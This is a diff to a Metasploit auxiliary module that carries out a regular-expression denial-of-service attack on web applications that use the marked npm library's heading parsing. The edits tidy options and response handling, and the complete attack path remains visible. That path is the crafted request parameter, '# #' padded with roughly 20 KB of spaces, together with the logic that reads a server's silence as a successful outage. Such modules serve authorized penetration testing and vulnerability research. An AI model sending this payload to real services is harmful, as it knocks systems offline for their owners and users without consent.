@@ -7,8 +7,8 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Dos
 
-  def initialize
-    super(
+  def initialize(info = {})
+    super(update_info(info,
       'Name'        => 'marked npm module "heading" ReDoS',
       'Description' => %q{
         This module exploits a Regular Expression Denial of Service vulnerability
@@ -28,13 +28,13 @@ class MetasploitModule < Msf::Auxiliary
           'Nick Starke, Sonatype Security Research'
         ],
       'License'     =>  MSF_LICENSE
-    )
+    ))
 
     register_options([
       Opt::RPORT(80),
       OptString.new('HTTP_METHOD', [true, 'The default HTTP Verb to use', 'GET']),
       OptString.new('HTTP_PARAMETER', [true, 'The vulnerable HTTP parameters', '']),
-      OptString.new('URI', [true, 'The URL Path to use', '/'])
+      OptString.new('TARGETURI', [true, 'The URL Path to use', '/'])
     ])
   end
 
@@ -52,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Sending ReDoS request to #{peer}.")
 
       params = {
-        'uri' => datastore['URI'],
+        'uri' => normalize_uri(target_uri.path),
         'method' => datastore['HTTP_METHOD'],
           ("vars_#{datastore['HTTP_METHOD'].downcase}") => {
             datastore['HTTP_PARAMETER'] =>  "# #" + (" " * 20 * 1024) + Rex::Text.rand_text_alpha(1)
@@ -61,12 +61,11 @@ class MetasploitModule < Msf::Auxiliary
 
       res = send_request_cgi(params)
 
-      unless res.nil?
+      if res
         fail_with(Failure::Unknown, "ReDoS request unsuccessful. Received status #{res.code} from #{peer}.")
       end
 
       print_status("No response received from #{peer}, service is most likely unresponsive.")
-
     rescue ::Rex::ConnectionRefused
       print_error("Unable to connect to #{peer}.")
     rescue ::Timeout::Error
@@ -104,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
         'method' => 'GET'
       })
 
-      if !res.nil? && (res.code >= 100 && res.code < 500)
+      if res && res.code >= 100 && res.code < 500
         print_status("Test request successful, attempting to send payload. Server returned #{res.code}")
         return true
       else
